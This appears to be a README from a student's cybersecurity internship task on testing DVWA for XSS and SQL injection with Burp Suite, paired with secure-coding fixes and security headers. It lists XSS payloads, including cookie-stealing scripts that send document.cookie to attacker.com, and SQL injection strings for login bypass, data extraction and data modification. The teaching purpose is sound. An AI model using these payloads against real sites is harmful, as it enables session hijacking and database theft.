# InternSpark Cybersecurity Internship - Task 2: Web Vulnerability Assessment

## 📋 Project Overview

This repository contains a comprehensive web application vulnerability assessment conducted as part of the **InternSpark Internship Program**. Task 2 focuses on identifying, analyzing, and exploiting common web vulnerabilities including Cross-Site Scripting (XSS) and SQL Injection.

### Project Details
- **Prepared By:** Rudresha RK
- **Institution:** InternSpark Internship
- **Task:** Task 2 - Web Vulnerability Assessment
- **Date:** June 2026
- **Classification:** CONFIDENTIAL / INTERNAL ONLY

---

## 🎯 Task 2 Objectives

✅ Identify XSS vulnerabilities (Reflected, Stored, DOM-based)  
✅ Detect SQL Injection weaknesses  
✅ Perform manual and automated vulnerability scanning  
✅ Exploit vulnerabilities in controlled environment  
✅ Analyze application code for security flaws  
✅ Test input validation mechanisms  
✅ Document vulnerability impact and risk  
✅ Provide remediation and secure coding guidelines  

---

## 📊 Assessment Details

| Category | Details |
|----------|---------|
| **Target Application** | DVWA (Damn Vulnerable Web Application) |
| **Testing Environment** | Burp Suite Professional/Community |
| **Protocols Tested** | HTTP, HTTPS |
| **Vulnerability Classes** | XSS, SQL Injection, CSRF, Command Injection |
| **Assessment Type** | Web Application Security Testing |
| **Methodology** | OWASP Top 10 |

---

## 🔐 Understanding Web Vulnerabilities

### 1. Cross-Site Scripting (XSS)

**Definition:** Injection of malicious scripts into web pages viewed by users

#### Types of XSS

##### A. Reflected XSS
```
Attack Flow:
1. Attacker crafts malicious URL with script
2. URL: http://target.com/search?q=<script>alert('XSS')</script>
3. Victim clicks link
4. Script executes in victim's browser
5. Can steal cookies, session tokens, redirect, phishing
```

**Example:**
```html
<!-- Vulnerable Code -->
<p>Search results for: <%= request.getParameter("q") %></p>

<!-- Attack URL -->
http://vulnerable.com/search.jsp?q=<script>document.location='http://attacker.com/steal?c='+document.cookie</script>
```

##### B. Stored XSS
```
Attack Flow:
1. Attacker injects script into database (via comment, post, etc.)
2. Script stored permanently
3. Every user viewing that page executes script
4. Can compromise all users
5. More dangerous than reflected
```

**Example:**
```html
<!-- Vulnerable Form -->
<form method="POST">
  <textarea name="comment"></textarea>
  <input type="submit">
</form>

<!-- Vulnerable Display -->
<div class="comments">
  <%= comment_from_db %>
</div>

<!-- Attack Payload -->
<script>
fetch('http://attacker.com/steal?c=' + document.cookie);
</script>
```

##### C. DOM-based XSS
```
Attack Flow:
1. Client-side JavaScript modifies DOM
2. Uses unsanitized user input
3. Attacker manipulates DOM through URL fragments
4. No server interaction required
```

**Example:**
```javascript
// Vulnerable Code
var search = location.hash.substring(1);
document.getElementById("searchBox").innerHTML = search;

// Attack URL
http://target.com#<img src=x onerror="alert('XSS')">
```

#### XSS Payloads

```javascript
// Basic alert
<script>alert('XSS')</script>

// Cookie stealing
<script>
fetch('http://attacker.com/steal?c=' + document.cookie);
</script>

// Image-based
<img src=x onerror="alert('XSS')">

// SVG-based
<svg onload="alert('XSS')">

// Event handlers
<body onload="alert('XSS')">
<iframe onload="alert('XSS')">
<input onfocus="alert('XSS')" autofocus>

// Event delegation
<svg/onload=alert('XSS')>

// Data URIs
<img src="data:text/html,<script>alert('XSS')</script>">

// Unicode encoding
<script>eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 39, 88, 83, 83, 39, 41))</script>
```

---

### 2. SQL Injection

**Definition:** Insertion of malicious SQL commands into input fields

#### SQL Injection Attack Vector

```
Normal Query:
SELECT * FROM users WHERE username='admin' AND password='admin123'

Malicious Input:
Username: admin' --
Result Query:
SELECT * FROM users WHERE username='admin' -- AND password='...'
-- Comment removes password check, login succeeds

---

Union-based Injection:
Username: admin' UNION SELECT 1,2,3 --
Retrieves additional data from other tables

---

Boolean-based Injection:
Username: admin' AND 1=1 --  (True - shows data)
Username: admin' AND 1=2 --  (False - no data)
Blind SQL Injection detection

---

Time-based Injection:
Username: admin'; WAITFOR DELAY '00:00:05' --
If page delays 5 seconds, injection succeeded
```

#### SQL Injection Examples

```sql
-- Authentication bypass
SELECT * FROM users WHERE username = 'admin' OR '1'='1' AND password = 'anything'
Result: Bypasses password check

-- Data extraction
SELECT * FROM users WHERE id = 1 UNION SELECT 1,username,password FROM admin_users

-- Database enumeration
' UNION SELECT table_name FROM information_schema.tables --

-- Command execution (MySQL)
SELECT INTO OUTFILE to write files
';exec xp_cmdshell; --

-- Data modification
'; UPDATE users SET admin=1 WHERE id=1; --

-- Blind detection
admin' AND SLEEP(5) --
admin' AND IF(1=1, SLEEP(5), 0) --
```

#### SQL Injection Payload Techniques

```
# Basic
' OR '1'='1
' OR 1=1 --
admin' --
admin' #

# Union-based
' UNION SELECT NULL,NULL,NULL --
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT username,password FROM users --

# Time-based
' AND SLEEP(5) --
' AND BENCHMARK(10000000, MD5('a')) --
'; WAITFOR DELAY '00:00:05' --

# Boolean-based
' AND 1=1 --
' AND 'a'='a
' AND 'a'='b

# Encoding bypass
' OR 'x'='x
%27 OR %271%27=%271
%27+OR+%271%27=%271
```

---

## 🔧 Burp Suite Usage Guide

### Installation
```bash
# Community Edition
sudo apt-get install burp-suite-community

# Or download from
https://portswigger.net/burp
```

### Main Burp Components

#### 1. Proxy
```
Purpose: Intercept and modify HTTP requests/responses
Function: Man-in-the-Middle (MITM) proxy

Steps:
1. Configure browser proxy to 127.0.0.1:8080
2. Install Burp CA certificate in browser
3. Enable "Intercept is on"
4. Browse target application
5. Intercept requests in Proxy tab
6. Modify parameters and forward
```

#### 2. Repeater
```
Purpose: Modify and resend individual requests
Function: Manual request manipulation

Usage:
1. Send request from Proxy to Repeater
2. Modify request (change parameters, add payloads)
3. Click "Send" to resend modified request
4. Analyze response
5. Iterate on changes
```

#### 3. Intruder
```
Purpose: Automated attack tool for fuzzing
Function: Mass parameter testing

Steps:
1. Send request to Intruder
2. Select attack type:
   - Sniper: One parameter, multiple payloads
   - Battering Ram: Multiple parameters, same payloads
   - Pitchfork: Multiple parameters, different payloads
   - Cluster Bomb: All parameter combinations
3. Define payload positions
4. Add payload list (wordlist, numbers, etc.)
5. Start attack
6. Analyze responses for vulnerabilities
```

#### 4. Scanner
```
Purpose: Automated vulnerability scanning
Function: Identify common vulnerabilities

Usage:
1. Passive scanning (background)
2. Active scanning (aggressive probing)
3. Review findings
4. Export report
```

#### 5. Sequencer
```
Purpose: Analyze token randomness
Function: Test session cookie strength

Usage:
1. Capture session tokens
2. Analyze randomness
3. Identify weak tokens
4. Generate new tokens
```

### Key Burp Operations

#### Intercepting Requests
```
1. Enable Proxy interception: Proxy > Options > Intercept requests
2. Configure browser:
   - Manual proxy: 127.0.0.1:8080
   - Or configure automatic proxy
3. Install certificate in browser
4. Browse application normally
5. Requests appear in Proxy tab
6. Modify as needed
7. Forward request
```

#### Testing for XSS
```
1. Identify user input fields
2. Send request to Repeater
3. Modify parameter with XSS payload:
   <script>alert('XSS')</script>
4. Forward request
5. Check response:
   - If payload appears unescaped = Vulnerable
   - If payload encoded/removed = Protected
4. Try alternative payloads if needed
```

#### Testing for SQL Injection
```
1. Identify SQL input fields (login, search, etc.)
2. Send request to Repeater
3. Modify parameter with SQL injection:
   admin' OR '1'='1
4. Forward request
5. Check response:
   - If behaves differently = Potentially vulnerable
   - If same as normal = Protected or filtered
6. Test with other payloads
7. Use blind/time-based if union not working
```

---

## 📋 Input Validation & Filtering

### Vulnerable Patterns

```php
// PHP - Vulnerable to XSS
<?php
echo "Welcome " . $_GET['username'];
?>

// PHP - Vulnerable to SQL Injection
<?php
$query = "SELECT * FROM users WHERE id=" . $_GET['id'];
$result = mysql_query($query);
?>

// JavaScript - Vulnerable to DOM XSS
<?php
var name = location.hash.substring(1);
document.getElementById('greeting').innerHTML = "Hello " + name;
?>
```

### Secure Coding Practices

#### 1. XSS Prevention

```php
// SECURE: Use HTML encoding
<?php
echo "Welcome " . htmlspecialchars($_GET['username'], ENT_QUOTES, 'UTF-8');
?>

// SECURE: Use templating engine with auto-escape
{% autoescape true %}
  Welcome {{ username }}
{% endautoescape %}

// SECURE: Content Security Policy header
header("Content-Security-Policy: script-src 'self'");

// SECURE: Use DOMPurify in JavaScript
var clean = DOMPurify.sanitize(userInput);
document.getElementById('output').textContent = clean;
```

#### 2. SQL Injection Prevention

```php
// SECURE: Use prepared statements
<?php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$result = $stmt->fetchAll();
?>

// SECURE: Use parameterized queries (PDO)
<?php
$pdo = new PDO('mysql:host=localhost;dbname=test', $user, $pass);
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $_POST['username']]);
?>

// SECURE: Use ORM (Object-Relational Mapping)
<?php
// Using Laravel Eloquent
$user = User::where('username', $username)->first();
?>

// SECURE: Input validation whitelist
<?php
$allowed_ids = [1, 2, 3, 4, 5];
if (in_array($_GET['id'], $allowed_ids)) {
    // Process only allowed IDs
}
?>
```

---

## 🛡️ Security Headers Implementation

```apache
# .htaccess - Apache
Header set X-Content-Type-Options "nosniff"
Header set X-Frame-Options "SAMEORIGIN"
Header set X-XSS-Protection "1; mode=block"
Header set Content-Security-Policy "default-src 'self'"
Header set Referrer-Policy "strict-origin-when-cross-origin"
Header set Permissions-Policy "geolocation=(), microphone=(), camera=()"
```

```nginx
# nginx
add_header X-Content-Type-Options "nosniff";
add_header X-Frame-Options "SAMEORIGIN";
add_header X-XSS-Protection "1; mode=block";
add_header Content-Security-Policy "default-src 'self'";
add_header Referrer-Policy "strict-origin-when-cross-origin";
```

```php
# PHP Headers
<?php
header("X-Content-Type-Options: nosniff");
header("X-Frame-Options: SAMEORIGIN");
header("X-XSS-Protection: 1; mode=block");
header("Content-Security-Policy: default-src 'self'");
header("Referrer-Policy: strict-origin-when-cross-origin");
?>
```

---

## 📁 Repository Structure

```
task-2/
├── TASK2_README.md
├── vulnerable_code/
│   ├── xss_examples.php
│   ├── sqli_examples.php
│   └── insecure_functions.php
├── burp_configs/
│   ├── burp_settings.json
│   └── payload_lists.txt
├── payloads/
│   ├── xss_payloads.txt
│   ├── sqli_payloads.txt
│   └── bypass_filters.txt
├── screenshots/
│   ├── xss_testing/
│   ├── sqli_testing/
│   ├── burp_proxy/
│   └── vulnerable_responses/
└── reports/
    ├── vulnerability_assessment_report.pdf
    ├── xss_findings.txt
    └── sqli_findings.txt
```

---

## 🔍 Testing Checklist

### XSS Testing
- [ ] Test all input fields (search, comments, etc.)
- [ ] Test in HTML context
- [ ] Test in JavaScript context
- [ ] Test in attribute context
- [ ] Test reflected XSS
- [ ] Test stored XSS
- [ ] Test DOM-based XSS
- [ ] Test filter bypasses
- [ ] Test double encoding
- [ ] Test Unicode encoding

### SQL Injection Testing
- [ ] Test login forms
- [ ] Test search functions
- [ ] Test pagination
- [ ] Test union-based injection
- [ ] Test blind SQL injection
- [ ] Test time-based injection
- [ ] Test error-based injection
- [ ] Test second-order injection
- [ ] Test encoding bypasses
- [ ] Test comment-based injection

---

## 📚 OWASP Top 10 (2021)

```
1. Broken Access Control
2. Cryptographic Failures
3. Injection (SQL, NoSQL, OS commands)
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable and Outdated Components
7. Authentication Failures
8. Software and Data Integrity Failures
9. Logging & Monitoring Failures
10. Server-Side Request Forgery (SSRF)
```

---

## 🔗 Resources & Tools

### Web Security Testing
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Burp Suite Documentation](https://portswigger.net/burp/documentation)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)

### Payload Databases
- [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)
- [OWASP CheatSheets](https://cheatsheetseries.owasp.org/)

### Vulnerable Applications
- [DVWA](http://www.dvwa.co.uk/)
- [WebGoat](https://owasp.org/www-project-webgoat/)
- [Juice Shop](https://owasp.org/www-project-juice-shop/)

---

## ⚠️ Legal & Ethical Notes

- ✅ Only test authorized applications
- ✅ Get written permission before testing
- ✅ Follow responsible disclosure
- ✅ Don't access unauthorized data
- ✅ Follow local laws and regulations

---

## 👤 Author Information

**Prepared By:** Rudresha RK  
**Program:** InternSpark Cybersecurity Internship  
**Date:** June 2026  

---

**Status:** Ready for Submission
